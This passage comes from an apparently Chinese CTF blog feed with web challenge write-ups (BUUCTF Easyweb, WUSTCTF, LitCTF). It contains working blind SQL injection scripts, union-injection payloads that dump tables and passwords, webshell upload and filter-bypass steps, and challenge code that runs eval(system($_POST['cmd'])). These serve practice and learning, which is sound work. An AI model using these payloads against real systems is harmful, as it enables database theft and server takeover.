</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;neepu-&gt;<span class="title function_ invoke__">neepuctf</span>()||!<span class="variable language_">$this</span>-&gt;neepu1-&gt;<span class="title function_ invoke__">neepuctf</span>())&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;fin-&gt;<span class="title function_ invoke__">NEEPUCTF</span>(<span class="variable">$this</span>-&gt;rce,<span class="variable">$this</span>-&gt;rce1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;neepu-&gt;<span class="title function_ invoke__">neepuctf</span>())&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;fin-&gt;<span class="title function_ invoke__">NEEPUCTF1</span>(<span class="variable">$this</span>-&gt;rce,<span class="variable">$this</span>-&gt;rce1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;key=<span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">five</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$finish</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>=<span class="variable language_">$this</span>-&gt;finish[<span class="variable">$name</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&quot;neepu&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">  <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>做不出来 是在太菜了 里面有我不会的知识点  没有属性值是怎么pop的 好离谱 </p><p>乖乖去刷ctfshow</p><p>先放着吧</p><p>之后再回来填坑 我是垃圾 呜呜呜 太菜了 菜的想死</p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssti </tag>
            
            <tag> PHP反序列化 </tag>
            
            <tag> flask框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-84-[CISCN2019 总决赛 Day2 Web1]Easyweb</title>
      <link href="/post/1e328461.html"/>
      <url>/post/1e328461.html</url>
      
        <content type="html"><![CDATA[<p>[CISCN2019 总决赛 Day2 Web1]Easyweb</p><span id="more"></span><p>一个登录界面 查看源码发现图片是通过<code>/image.php?id=1</code>获取的 猜测这里应该是有sql注入的</p><p>日常查看<code>/robots.txt</code>发现存在备份文件</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684632411207-29709d15-5b2b-4537-8cea-b8cae315b8ec.png" alt="img"></p><p>查看<code>image.php.bak</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure><p>发现存在sql注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);</span><br></pre></td></tr></table></figure><p>需要构造特殊的语句来注入</p><p><code>addslashes($id)</code> 先来看看addslashes()函数</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684632796661-b60d58ce-2bd8-425b-9ee7-aaa233bc2066.png" alt="img"></p><p>它会在这些符号前添加反斜杠进行转义</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684632822501-8d3aec4a-35e3-4af4-832e-f1426364e177.png" alt="img"></p><p>官方文档也提及了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684632852036-00011032-8464-4663-8b00-dd4e173b64b6.png" alt="img"></p><p>如果使用不得当 就会出现安全问题</p><p>再来看<code>$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);</code></p><p>看到<code>$id</code>存在一个替换操作</p><p>我们可以构造 <code>$id=\\0</code>&#x3D;&gt;经过addslashes()&#x3D;&gt;<code>$id=\\\\0</code>&#x3D;&gt;str_replace()&#x3D;&gt;<code>$id=\\</code>(相当于一个反斜杠)</p><p>则查询语句就会变为：<code>select * from images where id=&#39;\\&#39; or path=&#39;&#123;$path&#125;&#39;</code></p><p>id反斜杠转义了<code>&#39;</code>使得<code>$id=&#39;\\&#39; or path=&#39;</code>那么我们就可以在<code>$path</code>输入我们的注入语句</p><p>接下来就是一个常规的二分法盲注</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&#x27;http://3f7e38a8-5912-4127-be50-a4870ab3b5ad.node4.buuoj.cn:81/image.php&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    low=<span class="number">31</span></span><br><span class="line">    high=<span class="number">127</span></span><br><span class="line">    mid=(low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=high:</span><br><span class="line">        payload=&#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>:<span class="string">&quot;\\0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;path&quot;</span>:<span class="string">&quot; or ascii(substr((select password from users),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="built_in">format</span>(i,mid)&#125;</span><br><span class="line">        <span class="comment">#爆表: or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125; #</span></span><br><span class="line">        <span class="comment">#爆字段: or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),&#123;&#125;,1))&gt;&#123;&#125; #</span></span><br><span class="line">        <span class="comment">#爆数据: or ascii(substr((select password from users),&#123;&#125;,1))&gt;&#123;&#125; #</span></span><br><span class="line">        r = requests.get(url=url,params=payload)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;JFIF&quot;</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">            mid=(low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">            mid=(low+high)//<span class="number">2</span></span><br><span class="line">    result+=<span class="built_in">chr</span>(high+<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    time.sleep(<span class="number">0.3</span>)</span><br></pre></td></tr></table></figure><p>需要注意这道题目用于查询的where单双引号都被waf了 需要bypass</p><p>可以用16进制进行绕过 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684633339285-638d2e1f-801c-4188-8087-aab736f8c00a.png" alt="img"></p><p>可以得到admin密码为：<code>027e3da10ae66606cef2</code></p><p>之后是一个文件上传 简单上传一个一句话木马</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684633701281-14648259-464b-4663-8d4c-4641f64ea580.png" alt="img"></p><p>发现后php缀名都被过滤了 随便上传一个文件</p><p>提示：<code>I logged the file name you uploaded to logs/upload.4f264cd65c72b60d3bd54f98a8189048.log.php. LOL</code></p><p>他将我们的文件名上传到这个php文件</p><p>可以发现这个php文件记录了我们上传的文件名 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684633906495-cb78c8e9-a772-4278-834b-278e0f00268d.png" alt="img"></p><p>既然这个记录文件自身就为php文件 可以执行php代码 那么我们就可以通过修改文件名为一句话木马 从而getshell</p><p>这里他屏蔽了 php 用短标签bypass就行</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684634219540-a5cb5f62-63a9-4446-9ea2-36e3f8e54d98.png" alt="img"></p><p>不知道为什么有时候上传上去的文件名🐎他不显示 但是可以运行 很奇怪可能是环境问题</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684634365120-4e0455d5-7cdc-4ba0-b14e-0b92b9a7a146.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> sql bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-67-[WUSTCTF2020]颜值成绩查询</title>
      <link href="/post/4f323e41.html"/>
      <url>/post/4f323e41.html</url>
      
        <content type="html"><![CDATA[<p>[WUSTCTF2020]颜值成绩查询</p><span id="more"></span><p>一道经典的用if条件判断的二分法盲注题目 过滤了空格 用()嵌套或者&#x2F;**&#x2F;绕过就行了 其他还好</p><p>复习一下二分法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://622046c8-08bf-4bd2-8873-9d43830c90c6.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">25</span>):</span><br><span class="line">    low=<span class="number">31</span></span><br><span class="line">    high=<span class="number">127</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=high:</span><br><span class="line">        paylaod = &#123;<span class="string">&quot;stunum&quot;</span>:<span class="string">&quot;if(ascii(substr((select(value)from(ctf.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;</span>.<span class="built_in">format</span>(i,mid)&#125;</span><br><span class="line">        <span class="comment">#爆库：if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span></span><br><span class="line">        <span class="comment">#爆表：if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span></span><br><span class="line">        <span class="comment">#爆字段：if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span></span><br><span class="line">        <span class="comment">#爆数据：if(ascii(substr((select(value)from(ctf.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span></span><br><span class="line">        r = requests.get(url=url,params=paylaod)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">            mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid-<span class="number">1</span></span><br><span class="line">            mid = (low+high)//<span class="number">2</span></span><br><span class="line">    result+=<span class="built_in">chr</span>(high+<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    time.sleep(<span class="number">0.3</span>)</span><br></pre></td></tr></table></figure><p>当然也可以用异或来注入</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>^(<span class="built_in">ascii</span>(substr(database(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span>) <span class="comment">#爆库</span></span><br><span class="line"><span class="number">0</span>^(<span class="built_in">ascii</span>(substr((select(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)where(table_schema=<span class="string">&#x27;ctf&#x27;</span>)),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span>)  <span class="comment">#爆表</span></span><br><span class="line"><span class="number">0</span>^(<span class="built_in">ascii</span>(substr((select(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)where(table_name=<span class="string">&#x27;flag&#x27;</span>)),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span>)  爆字段</span><br><span class="line"><span class="number">0</span>^(<span class="built_in">ascii</span>(substr((select(value)<span class="keyword">from</span>(ctf.flag)),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span>)  <span class="comment">#爆数据</span></span><br></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> sql bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF 2023 （公开赛道）WEB方向WP</title>
      <link href="/post/d4be732.html"/>
      <url>/post/d4be732.html</url>
      
        <content type="html"><![CDATA[<p>LitCTF 2023（公开赛道）WEB方向WP</p><span id="more"></span><p>整体web都很简单，这次也是第一次ak所有web题目，总排名50&#x2F;1148，被实验室其他方向的👴带飞，keep on！</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684072731861-f783aba7-d561-4ec5-9c20-54d781cf52a8.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684072940858-74566b6d-dc39-4dec-8464-fad26ec85492.png" alt="img"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="我Flag呢？（彩蛋一）"><a href="#我Flag呢？（彩蛋一）" class="headerlink" title="我Flag呢？（彩蛋一）"></a>我Flag呢？（彩蛋一）</h2><p>查看源码爆flag</p><p>F12 彩蛋，但是当时是通过翻源码翻出来的，麻了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684033668164-5d2df6ff-3ad1-4ede-b6ad-1d886d55d3be.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;First_t0_The_k3y! (1/?)</span><br></pre></td></tr></table></figure><h2 id="导弹迷踪"><a href="#导弹迷踪" class="headerlink" title="导弹迷踪"></a>导弹迷踪</h2><p>查看<code>game.js</code>源码 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684037425180-3556324f-76ff-4d4b-97a6-a55708600309.png" alt="img"></p><h2 id="Follow-me-and-hack-me（彩蛋三）"><a href="#Follow-me-and-hack-me（彩蛋三）" class="headerlink" title="Follow me and hack me（彩蛋三）"></a>Follow me and hack me（彩蛋三）</h2><p>后来复现的时候才发现这道题把提交按钮ban了 当时做的时候直接用hackbar提交的 也是偷了一个一血:)</p><p>payload: <code>?CTF=Lit2023</code>  然后post一个<code>challenge=i&#39;m_c0m1ng</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684034356003-a989e1f1-6d35-43c3-ab50-0d2e8cb88a0c.png" alt="img"></p><p>提示有备份文件 <code>/www.zip</code>下载一个源码 里面有彩蛋三</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684034464808-7c54d155-8a9d-491a-8e96-1c3f34953e76.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_R3ady_Pl4yer_000ne_ (3/?)</span><br></pre></td></tr></table></figure><h2 id="PHP是世界上最好的语言！！"><a href="#PHP是世界上最好的语言！！" class="headerlink" title="PHP是世界上最好的语言！！"></a>PHP是世界上最好的语言！！</h2><p>写个php代码就行了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684034610396-b824eee6-a816-499c-b8be-41f084568a19.png" alt="img"></p><h2 id="Vim-yyds"><a href="#Vim-yyds" class="headerlink" title="Vim yyds"></a>Vim yyds</h2><p>vim 并且题目提示漏了 就想到是vim不正常退出导致的swp文件泄露 当时记得是在ctfshow刷题刷到的</p><p><code>.index.php.swp</code> 下载一个文件</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684034859095-af36e824-ba42-4bb6-a80e-efeab4e86f97.png" alt="img"></p><p>然后这里看了大佬的wp 才知道 vim -r可以恢复源码 tql</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684248441738-52d569f2-6bcb-47a5-8fbb-e1c05b344685.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">        body,</span><br><span class="line">        html &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            align-items: center;</span><br><span class="line">            justify-content: center;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        div.vim &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            align-content: center;</span><br><span class="line">            vertical-align: middle;</span><br><span class="line">            justify-content: center;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        img &#123;</span><br><span class="line">            border: none;</span><br><span class="line">            width: <span class="number">8</span>rem;</span><br><span class="line">            height: auto;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        h1.vim_yyds &#123;</span><br><span class="line">            color: <span class="comment">#50f728;</span></span><br><span class="line">            display: flex;</span><br><span class="line">            align-items: flex-start;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            margin-top: <span class="number">50</span>;</span><br><span class="line">            margin-left: <span class="number">5</span>px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        h3.vim_said &#123;</span><br><span class="line">            color: <span class="comment">#39c2ff;</span></span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            align-items: center;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        br,</span><br><span class="line">        p &#123;</span><br><span class="line">            font-size: <span class="number">20</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;main&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">vim</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">https</span>://<span class="title">www</span>.<span class="title">bing</span>.<span class="title">com</span>/<span class="title">th</span>?<span class="title">id</span>=<span class="title">OSAAS</span>.7<span class="title">B95FA2D97CE022F5E7949F60E350A25</span>&amp;<span class="title">pid</span>=<span class="title">TechQna</span>&quot;&gt;&lt;/<span class="title">img</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h1</span> <span class="title">class</span>=&quot;<span class="title">vim_yyds</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                <span class="title">Vim</span> <span class="title">yyds</span></span></span><br><span class="line"><span class="class">            &lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">vim_said</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            队里师傅说<span class="title">Vim</span>是世界上最好的编辑器，不接受反驳</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">can_can_vim</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">            <span class="title">error_reporting</span>(0);</span></span><br><span class="line"><span class="class">            $<span class="title">password</span> = &quot;<span class="title">Give_Me_Your_Flag</span>&quot;;</span></span><br><span class="line"><span class="class">            <span class="title">echo</span> &quot;&lt;<span class="title">p</span>&gt;<span class="title">can</span> <span class="title">can</span> <span class="title">need</span> <span class="title">Vim</span> &lt;/<span class="title">p</span>&gt;&quot;;</span></span><br><span class="line"><span class="class">            <span class="title">if</span> ($<span class="title">_POST</span>[&#x27;<span class="title">password</span>&#x27;] === <span class="title">base64_encode</span>($<span class="title">password</span>)) </span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/main&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>post一个cmd命令执行 并且password要等与base64加密后的password 传参即可</p><h2 id="作业管理系统-彩蛋二"><a href="#作业管理系统-彩蛋二" class="headerlink" title="作业管理系统(彩蛋二)"></a>作业管理系统(彩蛋二)</h2><p>查看源码显示用户名密码都是admin</p><p>然后上传一个一句话木马    <code>/木马</code>访问就行了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684035114439-8aede763-cfc9-49f0-b85e-a884b143cb74.png" alt="img"></p><p>然后在这里能看到一个github链接 点进去就是第二个彩蛋  <code>_S0_ne3t? (2/?)</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684035147381-e408d351-3515-4d0e-80b4-9c75a70f25a0.png" alt="img"></p><h2 id="这是什么？SQL-！注一下-！（彩蛋四）"><a href="#这是什么？SQL-！注一下-！（彩蛋四）" class="headerlink" title="这是什么？SQL ！注一下 ！（彩蛋四）"></a>这是什么？SQL ！注一下 ！（彩蛋四）</h2><p>这个题目真给自己无语住了 一开始用1，2都有正常回显 其他都没有回显 以为是盲注 注了半天还注出来了  发现里面没有flag表和字段 就感觉自己做错了</p><p>回头看看 发现是简单的联合注入 真无语住了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684035351491-b625f56a-6681-4d95-86fb-15c72d1cbae9.png" alt="img"></p><p>根据题目是sql语句闭合是<code>))))))</code></p><p>payload:</p><p>爆数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1)))))) union  select 1,group_concat(schema_name) from information_schema.schemata#</span><br><span class="line">information_schema,mysql,ctftraining,performance_schema,test,ctf</span><br></pre></td></tr></table></figure><p>爆表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1)))))) union select 2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctftraining&#x27;#</span><br><span 